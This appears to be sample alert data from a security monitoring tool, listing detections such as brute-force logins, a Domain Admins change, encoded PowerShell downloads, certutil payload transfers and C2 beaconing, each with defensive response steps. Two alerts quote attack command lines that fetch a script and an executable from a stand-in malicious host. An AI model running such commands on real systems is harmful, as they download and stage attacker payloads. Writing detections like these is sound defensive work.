title: Successful login after brute force pattern
description: 5 failed logins for svc-backup from 203.0.113.45 were observed inside a 10 minute window.

mitre_attack.name: Valid Accounts
mitre_attack.tactic: Defense Evasion / Persistence / Privilege Escalation / Initial Access

recommended_actions: Disable or reset the affected account until ownership is verified.
Review VPN and identity-provider logs for additional source IPs.
Confirm whether the successful login created new sessions or tokens.

title: Privileged group membership change
description: temp-admin modified privileged access on DC-01: temp-admin added mlee to Domain Admins
recommended_actions: Validate the change ticket and business owner.
Review recent activity for both the admin actor and the newly privileged user.

title: Large outbound data transfer
recommended_actions: Confirm whether the transfer was approved business activity.
Review file access logs for sensitive data touched before upload.
Preserve proxy logs and destination metadata for escalation.

title: Encoded PowerShell download activity
description: FIN-WS-07 ran powershell.exe: powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgA; Invoke-WebRequest http://malicious-update.test/a.ps1 -OutFile C:\ProgramData\a.ps1
recommended_actions: Isolate the endpoint if the command was not approved change activity.
Acquire process tree, command history, and related file hashes.
Search endpoint telemetry for the same command line or hash.

title: Certutil payload transfer activity
description: FIN-WS-07 ran certutil.exe: certutil.exe -urlcache -split -f http://malicious-update.test/payload.exe C:\ProgramData\payload.exe
recommended_actions: Isolate the endpoint if the command was not approved change activity.
Acquire process tree, command history, and related file hashes.
Search endpoint telemetry for the same command line or hash.

title: Periodic outbound beaconing pattern
description: DEV-LAPTOP-22 contacted c2-checkin.evil-example.test 5 times over 20 minutes.
recommended_actions: Block the destination at egress controls while investigation continues.
Review DNS, proxy, and endpoint telemetry for related callbacks.
Check the host for persistence mechanisms and recently spawned processes.
